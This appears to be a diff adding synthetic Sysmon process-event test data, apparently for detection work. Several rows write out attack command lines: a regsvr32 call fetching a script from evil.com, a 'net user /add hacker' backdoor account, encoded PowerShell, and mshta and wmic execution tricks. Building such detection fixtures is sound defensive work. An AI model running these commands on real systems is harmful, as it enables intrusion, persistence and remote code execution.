@@ -1,0 +1,11 @@
+TimeGenerated,Computer,EventID,Image,CommandLine,User,ProcessId,ParentImage,ParentCommandLine,Hashes
+2024-01-15 10:30:15,WORKSTATION-01,1,C:\Windows\System32\powershell.exe,powershell.exe -EncodedCommand JABlAHgAZQBjACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==,DOMAIN\user1,1234,C:\Windows\explorer.exe,C:\Windows\Explorer.EXE,SHA256=A1B2C3D4E5F6
+2024-01-15 10:31:20,WORKSTATION-01,1,C:\Windows\System32\cmd.exe,cmd.exe /c whoami,DOMAIN\user1,1235,C:\Windows\System32\powershell.exe,powershell.exe,SHA256=B2C3D4E5F6A1
+2024-01-15 10:32:25,WORKSTATION-02,1,C:\Temp\malware.exe,malware.exe --install --silent,DOMAIN\user2,1236,C:\Windows\explorer.exe,C:\Windows\Explorer.EXE,SHA256=C3D4E5F6A1B2
+2024-01-15 10:33:30,WORKSTATION-01,1,C:\Windows\System32\net.exe,net user /add hacker P@ssw0rd,DOMAIN\user1,1237,C:\Windows\System32\cmd.exe,cmd.exe,SHA256=D4E5F6A1B2C3
+2024-01-15 10:34:35,WORKSTATION-03,1,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /u /i:http://evil.com/script.sct scrobj.dll,DOMAIN\user3,1238,C:\Windows\explorer.exe,C:\Windows\Explorer.EXE,SHA256=E5F6A1B2C3D4
+2024-01-15 10:35:40,WORKSTATION-01,7,C:\Windows\System32\lsass.exe,,SYSTEM,500,C:\Windows\System32\wininit.exe,wininit.exe,SHA256=F6A1B2C3D4E5
+2024-01-15 10:36:45,WORKSTATION-02,1,C:\Windows\System32\mshta.exe,mshta.exe javascript:eval('var shell = new ActiveXObject(\"WScript.Shell\");shell.run(\"calc\");'),DOMAIN\user2,1239,C:\Windows\explorer.exe,C:\Windows\Explorer.EXE,SHA256=A1B2C3D4E5F6
+2024-01-15 10:37:50,WORKSTATION-01,3,C:\Windows\System32\svchost.exe,,SYSTEM,1001,C:\Windows\System32\services.exe,services.exe,SHA256=B2C3D4E5F6A1
+2024-01-15 10:38:55,WORKSTATION-04,1,C:\Windows\System32\rundll32.exe,rundll32.exe shell32.dll Control_RunDLL desk.cpl,DOMAIN\user4,1240,C:\Windows\explorer.exe,C:\Windows\Explorer.EXE,SHA256=C3D4E5F6A1B2
+2024-01-15 10:39:00,WORKSTATION-01,1,C:\Windows\System32\wmic.exe,wmic process call create \"calc.exe\",DOMAIN\user1,1241,C:\Windows\System32\cmd.exe,cmd.exe,SHA256=D4E5F6A1B2C3
